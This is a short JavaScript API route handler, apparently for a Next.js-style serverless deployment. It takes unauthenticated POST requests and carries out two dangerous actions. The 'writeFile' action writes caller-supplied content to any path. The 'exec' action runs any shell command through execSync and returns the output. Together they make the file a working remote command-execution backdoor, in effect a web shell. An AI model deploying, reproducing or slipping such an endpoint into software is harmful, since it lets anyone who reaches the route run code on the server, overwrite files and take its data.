export default async function handler(req, res) {
  try {
    if (req.method !== "POST") {
      return res.status(405).json({ error: "POST only" });
    }

    const body = req.body;
    console.log("Received CMD:", body);

    const { action, payload } = body;

    switch (action) {
      case "ping":
        return res.status(200).json({ ok: true, reply: "pong" });

      case "writeFile":
        // пример: { action: "writeFile", payload: { path: "test.txt", content: "Hello" } }
        const fs = require("fs");
        fs.writeFileSync(payload.path, payload.content);
        return res.status(200).json({ ok: true, done: true });

      case "exec":
        // пример: { action: "exec", payload: { cmd: "ls -la" } }
        const { execSync } = require("child_process");
        const output = execSync(payload.cmd).toString();
        return res.status(200).json({ ok: true, output });

      default:
        return res.status(400).json({ error: "Unknown action" });
    }
  } catch (err) {
    return res.status(500).json({ error: err.toString() });
  }
}
